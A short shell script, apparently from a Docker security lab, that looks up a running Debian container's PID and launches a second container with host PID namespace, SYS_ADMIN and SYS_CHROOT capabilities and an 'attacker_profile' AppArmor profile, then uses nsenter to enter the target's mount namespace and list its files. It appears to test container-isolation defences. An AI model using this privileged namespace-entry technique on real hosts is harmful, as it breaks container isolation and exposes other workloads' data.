#!/bin/sh

attack="home/ubuntu/Security-on-Docker/Attacks/Hosts_fs/privileged_attacker/minitest"
docker ps | grep debian > dockerps
cut -d' ' -f1 dockerps > containerid
container_id=$(cat containerid)
docker inspect --format {{.State.Pid}} ${container_id} > PID
container_pid=$(cat PID)
rm PID

#Attack container
docker run --security-opt "apparmor=attacker_profile" --pid=host --cap-add SYS_ADMIN --cap-add SYS_CHROOT --rm -it debian:latest nsenter --target ${container_pid} --mount ls

sudo rm dockerps
sudo rm containerid
